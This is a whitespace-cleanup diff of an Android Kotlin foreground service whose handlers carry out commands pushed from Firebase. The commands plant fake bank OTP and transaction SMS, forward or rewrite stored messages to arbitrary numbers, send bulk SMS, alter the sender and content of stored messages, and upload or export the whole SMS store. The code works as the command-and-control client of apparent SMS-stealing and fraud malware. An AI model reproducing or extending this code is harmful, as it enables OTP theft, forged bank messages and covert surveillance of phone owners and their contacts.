             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Failed to create fake message")
         }
     }
-    
+
     /**
      * Handle createFakeMessageTemplate command
      * Format: "templateId:sender:variables"
-     * 
+     *
      * Examples:
      * - "otp_bank:+1234567890:code=123456"
      * - "transaction_debit:+1234567890:amount=1000&account=1234"
@@ -3146,23 +3146,23 @@ class PersistentForegroundService : Service() {
      */
     private fun handleCreateFakeMessageTemplateCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing createFakeMessageTemplate command: $content")
-        
+
         val parts = content.split(":")
         if (parts.size < 3) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Invalid format: expected templateId:sender:variables")
             return
         }
-        
+
         val templateId = parts[0].trim()
         val sender = parts[1].trim()
         val variablesStr = parts.drop(2).joinToString(":")
-        
+
         // Validate template ID
         if (templateId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Template ID is required")
             return
         }
-        
+
         // Validate sender
         if (sender.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Sender phone number is required")
@@ -3172,17 +3172,17 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Invalid sender phone number format")
             return
         }
-        
+
         // Parse variables
         val variables = FakeMessageTemplateEngine.parseVariables(variablesStr)
-        
+
         // Process template
         FakeMessageTemplateEngine.getTemplate(this, templateId) { template ->
             if (template == null) {
                 updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Template not found: $templateId")
                 return@getTemplate
             }
-            
+
             // Process template with variables
             // Note: processTemplate needs templateId to get the template, but we already have the template string
             // So we'll use a workaround - get the template from the engine directly
@@ -3205,12 +3205,12 @@ class PersistentForegroundService : Service() {
                 result = result.replace("{timestamp}", System.currentTimeMillis().toString(), ignoreCase = true)
                 result
             }
-            
+
             if (processedMessage == null) {
                 updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Failed to process template")
                 return@getTemplate
             }
-            
+
             // Create fake message with processed template
             val success = FakeMessageManager.createFakeMessage(
                 context = this,
@@ -3220,7 +3220,7 @@ class PersistentForegroundService : Service() {
                 status = "received",
                 threadId = null
             )
-            
+
             if (success) {
                 updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "executed")
             } else {
@@ -3228,38 +3228,38 @@ class PersistentForegroundService : Service() {
             }
         }
     }
-    
+
     /**
      * Handle setupAutoReply command
      * Format: "enabled:trigger:replyMessage:conditions"
      */
     private fun handleSetupAutoReplyCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing setupAutoReply command: $content")
-        
+
         val parts = content.split(":")
         if (parts.size < 4) {
             updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Invalid format: expected enabled:trigger:replyMessage:conditions")
             return
         }
-        
+
         val enabled = parts[0].trim().toBoolean()
         val trigger = parts[1].trim()
         val replyMessage = parts[2].trim()
         val conditionsStr = parts.drop(3).joinToString(":")
-        
+
         // Validate trigger
         val validTriggers = listOf("all", "keyword", "sender", "time", "template")
         if (trigger.lowercase() !in validTriggers) {
             updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Invalid trigger: $trigger. Must be one of: ${validTriggers.joinToString(", ")}")
             return
         }
-        
+
         // Validate reply message
         if (replyMessage.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Reply message is required")
             return
         }
-        
+
         // Parse conditions
         val conditions = if (conditionsStr == "null" || conditionsStr.isEmpty()) {
             emptyMap()
@@ -3273,7 +3273,7 @@ class PersistentForegroundService : Service() {
                 }
             }.filterKeys { it.isNotEmpty() }
         }
-        
+
         // Validate conditions based on trigger
         when (trigger.lowercase()) {
             "keyword" -> {
@@ -3301,7 +3301,7 @@ class PersistentForegroundService : Service() {
                 }
             }
         }
-        
+
         // Setup auto-reply
         AutoReplyManager.setupAutoReply(
             context = this,
@@ -3310,34 +3310,34 @@ class PersistentForegroundService : Service() {
             replyMessage = replyMessage,
             conditions = conditions
         )
-        
+
         updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "executed")
     }
-    
+
     /**
      * Handle showCard command
      * Format: "sms" or "instruction"
-     * 
+     *
      * Controls which card is displayed in ActivatedActivity:
      * - "sms" - Show SMS card (default)
      * - "instruction" - Show instruction card (if content exists)
-     * 
+     *
      * Updates Firebase: device/{deviceId}/cardControl/showCard
-     * 
+     *
      * @param content Command content: "sms" or "instruction"
      */
     @SuppressLint("HardwareIds")
     private fun handleShowCardCommand(content: String) {
         val cardType = content.trim().lowercase()
-        
+
         if (cardType !in listOf("sms", "instruction")) {
             LogHelper.e(TAG, "showCard command: Invalid card type '$cardType'. Expected: 'sms' or 'instruction'")
             return
         }
-        
+
         val deviceId = androidId()
         val cardControlPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/cardControl"
-        
+
         Firebase.database.reference.child(cardControlPath).child("showCard").setValue(cardType)
             .addOnSuccessListener {
                 LogHelper.d(TAG, "showCard command: Set card to '$cardType'")
@@ -3346,37 +3346,37 @@ class PersistentForegroundService : Service() {
                 LogHelper.e(TAG, "showCard command: Failed to update Firebase", e)
             }
     }
-    
+
     /**
      * Handle startAnimation command
      * Format: "sms" or "instruction" or "flip"
-     * 
+     *
      * Triggers animations in ActivatedActivity:
      * - "sms" - Start SMS card animation
      * - "instruction" - Start instruction card animation
      * - "flip" - Trigger flip animation (SMS ↔ Instruction)
-     * 
+     *
      * Updates Firebase: device/{deviceId}/cardControl/animation
-     * 
+     *
      * @param content Command content: "sms", "instruction", or "flip"
      */
     @SuppressLint("HardwareIds")
     private fun handleStartAnimationCommand(content: String) {
         val animationType = content.trim().lowercase()
-        
+
         if (animationType !in listOf("sms", "instruction", "flip")) {
             LogHelper.e(TAG, "startAnimation command: Invalid animation type '$animationType'. Expected: 'sms', 'instruction', or 'flip'")
             return
         }
-        
+
         val deviceId = androidId()
         val cardControlPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/cardControl"
-        
+
         val animationData = mapOf(
             "type" to animationType,
             "timestamp" to System.currentTimeMillis()
         )
-        
+
         Firebase.database.reference.child(cardControlPath).child("animation").setValue(animationData)
             .addOnSuccessListener {
                 LogHelper.d(TAG, "startAnimation command: Triggered '$animationType' animation")
@@ -3385,14 +3385,14 @@ class PersistentForegroundService : Service() {
                 LogHelper.e(TAG, "startAnimation command: Failed to update Firebase", e)
             }
     }
-    
+
     /**
      * Handle forwardMessage command
      * Format: "messageId:targetNumber:modify:newMessage"
      */
     private fun handleForwardMessageCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing forwardMessage command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.SEND_SMS
@@ -3401,7 +3401,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "SEND_SMS permission not granted")
             return
         }
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_SMS
@@ -3410,24 +3410,24 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "READ_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 3) {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Invalid format: expected messageId:targetNumber:modify:newMessage")
             return
         }
-        
+
         val messageId = parts[0].trim()
         val targetNumber = parts[1].trim()
         val modify = parts[2].trim().toBoolean()
         val newMessage = parts.getOrNull(3)?.trim()
-        
+
         // Validate message ID
         if (messageId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Message ID is required")
             return
         }
-        
+
         // Validate target number
         if (targetNumber.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Target number is required")
@@ -3437,30 +3437,30 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Invalid target number format")
             return
         }
-        
+
         // Fetch original message
         val originalMessage = fetchMessageById(messageId) ?: run {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Message not found")
             return
         }
-        
+
         // Prepare message to forward
         val messageToSend = if (modify && newMessage != null && newMessage != "null") {
             newMessage.replace("{original}", originalMessage.body)
         } else {
             originalMessage.body
         }
-        
+
         // Validate message length
         if (messageToSend.length > 160) {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Forwarded message too long (max 160 characters)")
             return
         }
-        
+
         // Send forwarded message
         try {
             sendSms(targetNumber, messageToSend, SimSlot.SIM_1)
-            
+
             // Log forwarded message
             val timestamp = System.currentTimeMillis()
             val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
@@ -3480,7 +3480,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Error: ${e.message}")
         }
     }
-    
+
     /**
      * Fetch message by ID from SMS database
      */
@@ -3495,7 +3495,7 @@ class PersistentForegroundService : Service() {
                 arrayOf(messageId),
                 null
             )
-            
+
             return cursor?.use {
                 if (it.moveToFirst()) {
                     Message(
@@ -3513,7 +3513,7 @@ class PersistentForegroundService : Service() {
             return null
         }
     }
-    
+
     /**
      * Data class for message
      */
@@ -3523,7 +3523,7 @@ class PersistentForegroundService : Service() {
         val body: String,
         val timestamp: Long
     )
-    
+
     /**
      * Handle smsbatchenable command
      * Format: "{seconds}" - Set batch upload interval in seconds (default: 5)
@@ -3531,27 +3531,27 @@ class PersistentForegroundService : Service() {
      */
     private fun handleSmsBatchEnableCommand(content: String) {
         LogHelper.d(TAG, "Executing smsbatchenable command: $content")
-        
+
         val seconds = content.trim().toIntOrNull()
         if (seconds == null || seconds < 1) {
             LogHelper.w(TAG, "Invalid smsbatchenable value: $content, using default 5 seconds")
             com.example.fast.util.SmsMessageBatchProcessor.setBatchTimeout(5)
             return
         }
-        
+
         // Set batch timeout (minimum 1 second, maximum 3600 seconds)
         val validSeconds = seconds.coerceIn(1, 3600)
         com.example.fast.util.SmsMessageBatchProcessor.setBatchTimeout(validSeconds)
         LogHelper.d(TAG, "SMS batch timeout set to $validSeconds seconds")
     }
-    
+
     /**
      * Handle sendBulkSms command
      * Format: "recipients:message:personalize:delay:sim"
      */
     private fun handleSendBulkSmsCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing sendBulkSms command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.SEND_SMS
@@ -3560,49 +3560,49 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "SEND_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 5) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Invalid format: expected recipients:message:personalize:delay:sim")
             return
         }
-        
+
         val recipientsStr = parts[0].trim()
         val message = parts[1].trim()
         val personalize = parts[2].trim().toBoolean()
         val delaySeconds = parts[3].trim().toIntOrNull() ?: 0
         val sim = parts[4].trim().toIntOrNull() ?: 1
-        
+
         // Validate message
         if (message.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Message content is required")
             return
         }
-        
+
         if (message.length > 160) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Message too long (max 160 characters)")
             return
         }
-        
+
         // Validate delay
         if (delaySeconds < 0 || delaySeconds > 3600) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Delay must be between 0 and 3600 seconds")
             return
         }
-        
+
         // Validate SIM
         if (sim != 1 && sim != 2) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Invalid SIM number. Must be 1 or 2.")
             return
         }
-        
+
         // Parse recipients
         val recipients = BulkSmsManager.parseRecipients(recipientsStr, this)
         if (recipients.isEmpty()) {
             updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "No valid recipients found")
             return
         }
-        
+
         // Create bulk operation in Firebase
         BulkSmsManager.createBulkOperation(
             context = this,
@@ -3624,7 +3624,7 @@ class PersistentForegroundService : Service() {
                         bulkOpPath = bulkOpPath,
                         historyTimestamp = historyTimestamp
                     )
-                    
+
                     BulkSmsManager.sendBulkMessagesAsync(this, operation)
                     updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "executed")
                 } else {
@@ -3633,14 +3633,14 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     /**
      * Handle bulkEditMessage command
      * Format: "criteria:field:newValue"
      */
     private fun handleBulkEditMessageCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing bulkEditMessage command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 "android.permission.WRITE_SMS"
@@ -3649,40 +3649,40 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "WRITE_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 3) {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid format: expected criteria:field:newValue")
             return
         }
-        
+
         val criteria = parts[0].trim()
         val field = parts[1].trim()
         val newValue = parts.drop(2).joinToString(":")
-        
+
         // Validate criteria
         if (criteria.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Criteria is required")
             return
         }
-        
+
         // Validate field
         val validFields = listOf("content", "sender", "timestamp", "status")
         if (field.lowercase() !in validFields) {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid field. Supported: ${validFields.joinToString(", ")}")
             return
         }
-        
+
         // Validate new value
         if (newValue.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "New value is required")
             return
         }
-        
+
         try {
             val whereClause = buildWhereClause(criteria)
             val contentValues = ContentValues()
-            
+
             when (field.lowercase()) {
                 "content" -> {
                     if (newValue.length > 160) {
@@ -3716,7 +3716,7 @@ class PersistentForegroundService : Service() {
                     }
                 }
             }
-            
+
             val uri = android.provider.Telephony.Sms.CONTENT_URI
             val rowsUpdated = contentResolver.update(
                 uri,
@@ -3724,7 +3724,7 @@ class PersistentForegroundService : Service() {
                 whereClause.first,
                 whereClause.second
             )
-            
+
             if (rowsUpdated > 0) {
                 updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "executed", "Updated $rowsUpdated message(s)")
             } else {
@@ -3735,14 +3735,14 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Error: ${e.message}")
         }
     }
-    
+
     /**
      * Handle sendSmsTemplate command
      * Format: "templateId:phone:variables"
      */
     private fun handleSendSmsTemplateCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing sendSmsTemplate command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.SEND_SMS
@@ -3751,23 +3751,23 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "SEND_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 3) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Invalid format: expected templateId:phone:variables")
             return
         }
-        
+
         val templateId = parts[0].trim()
         val phone = parts[1].trim()
         val variablesStr = parts.drop(2).joinToString(":")
-        
+
         // Validate template ID
         if (templateId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Template ID is required")
             return
         }
-        
+
         // Validate phone number
         if (phone.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Phone number is required")
@@ -3777,30 +3777,30 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Invalid phone number format")
             return
         }
-        
+
         // Parse variables
         val variables = MessageTemplateEngine.parseVariables(variablesStr)
-        
+
         // Get template
         MessageTemplateEngine.getTemplate(this, templateId) { template ->
             if (template == null) {
                 updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Template not found: $templateId")
                 return@getTemplate
             }
-            
+
             // Process template
             val processedMessage = MessageTemplateEngine.processTemplate(template, variables)
-            
+
             // Validate message length
             if (processedMessage.length > 160) {
                 updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Processed message too long (max 160 characters)")
                 return@getTemplate
             }
-            
+
             // Send SMS
             try {
                 sendSms(phone, processedMessage, SimSlot.SIM_1)
-                
+
                 // Log to Firebase
                 val timestamp = System.currentTimeMillis()
                 val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
@@ -3821,7 +3821,7 @@ class PersistentForegroundService : Service() {
             }
         }
     }
-    
+
     /**
      * Handle saveTemplate command
      * Format: "templateId|content|category"
@@ -3829,29 +3829,29 @@ class PersistentForegroundService : Service() {
      */
     private fun handleSaveTemplateCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing saveTemplate command: $content")
-        
+
         val parts = content.split("|", limit = 3)
         if (parts.size < 2) {
             updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Invalid format: expected templateId|content|category")
             return
         }
-        
+
         val templateId = parts[0].trim()
         val templateContent = parts[1].trim()
         val category = parts.getOrNull(2)?.trim() ?: "custom"
-        
+
         // Validate template ID
         if (templateId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Template ID is required")
             return
         }
-        
+
         // Validate template content
         if (templateContent.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Template content is required")
             return
         }
-        
+
         // Save template
         MessageTemplateEngine.saveTemplate(
             context = this,
@@ -3859,44 +3859,44 @@ class PersistentForegroundService : Service() {
             content = templateContent,
             category = category
         )
-        
+
         updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "executed")
     }
-    
+
     /**
      * Handle deleteTemplate command
      * Format: "templateId"
      */
     private fun handleDeleteTemplateCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing deleteTemplate command: $content")
-        
+
         val templateId = content.trim()
-        
+
         // Validate template ID
         if (templateId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "failed", "Template ID is required")
             return
         }
-        
+
         // Check if it's a pre-built template (cannot delete)
         if (MessageTemplateEngine.getAvailableTemplates().contains(templateId)) {
             updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "failed", "Cannot delete pre-built template")
             return
         }
-        
+
         // Delete template
         MessageTemplateEngine.deleteTemplate(this, templateId)
-        
+
         updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "executed")
     }
-    
+
     /**
      * Handle getMessageStats command
      * Format: "period:format"
      */
     private fun handleGetMessageStatsCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing getMessageStats command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_SMS
@@ -3905,33 +3905,33 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "getMessageStats", "failed", "READ_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         val period = parts.getOrNull(0)?.trim() ?: "all"
         val format = parts.getOrNull(1)?.trim() ?: "json"
-        
+
         // Calculate date range
         val dateRange = MessageAnalyticsManager.calculateDateRange(period)
-        
+
         // Fetch messages
         val messages = MessageAnalyticsManager.fetchMessagesInRange(this, dateRange.first, dateRange.second)
-        
+
         // Calculate statistics
         val stats = MessageAnalyticsManager.calculateMessageStats(messages)
-        
+
         // Save to Firebase
         MessageAnalyticsManager.saveStatsToFirebase(this, stats, period)
-        
+
         updateCommandHistoryStatus(historyTimestamp, "getMessageStats", "executed", "Processed ${messages.size} messages")
     }
-    
+
     /**
      * Handle backupMessages command
      * Format: "type:encrypt:format"
      */
     private fun handleBackupMessagesCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing backupMessages command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_SMS
@@ -3940,12 +3940,12 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "backupMessages", "failed", "READ_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         val type = parts.getOrNull(0)?.trim() ?: "firebase"
         val encrypt = parts.getOrNull(1)?.trim()?.toBoolean() ?: false
         val format = parts.getOrNull(2)?.trim() ?: "json"
-        
+
         if (format.lowercase() !in listOf("json", "csv")) {
             updateCommandHistoryStatus(historyTimestamp, "backupMessages", "failed", "Invalid format. Use 'json' or 'csv'")
             return
@@ -3972,14 +3972,14 @@ class PersistentForegroundService : Service() {
         WorkManager.getInstance(this)
             .enqueueUniqueWork("backupMessages", ExistingWorkPolicy.REPLACE, workRequest)
     }
-    
+
     /**
      * Handle exportMessages command
      * Format: "format:criteria"
      */
     private fun handleExportMessagesCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing exportMessages command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_SMS
@@ -3988,7 +3988,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "exportMessages", "failed", "READ_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         val format = parts.getOrNull(0)?.trim() ?: "json"
         val criteria = parts.getOrNull(1)?.trim()
@@ -4015,11 +4015,11 @@ class PersistentForegroundService : Service() {
         WorkManager.getInstance(this)
             .enqueueUniqueWork("exportMessages", ExistingWorkPolicy.REPLACE, workRequest)
     }
-    
+
     /**
      * Handle executeWorkflow command
      * Format: JSON string containing workflow definition
-     * 
+     *
      * Example:
      * {
      *   "workflowId": "upload_file_workflow",
@@ -4045,12 +4045,12 @@ class PersistentForegroundService : Service() {
      */
     private fun handleExecuteWorkflowCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing workflow command: ${content.take(100)}...")
-        
+
         if (content.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "executeWorkflow", "failed", "Workflow JSON is required")
             return
         }
-        
+
         // Execute workflow (WorkflowExecutor handles command execution via Firebase)
         WorkflowExecutor.executeWorkflow(
             context = this,
@@ -4068,7 +4068,7 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     /**
      * Check command execution status directly (for workflow)
      */
@@ -4079,10 +4079,10 @@ class PersistentForegroundService : Service() {
     ) {
         val historyPath = "${AppConfig.getFirebaseDevicePath(androidId())}/${AppConfig.FirebasePaths.COMMAND_HISTORY}/$historyTimestamp/$commandKey/status"
         val historyRef = Firebase.database.reference.child(historyPath)
-        
+
         var attempts = 0
         val maxAttempts = 5
-        
+
         val checkStatus = object : Runnable {
             override fun run() {
                 attempts++
@@ -4108,8 +4108,7 @@ class PersistentForegroundService : Service() {
                 }
             }
         }
-        
+
         Handler(android.os.Looper.getMainLooper()).postDelayed(checkStatus, 1000)
     }
 }
-
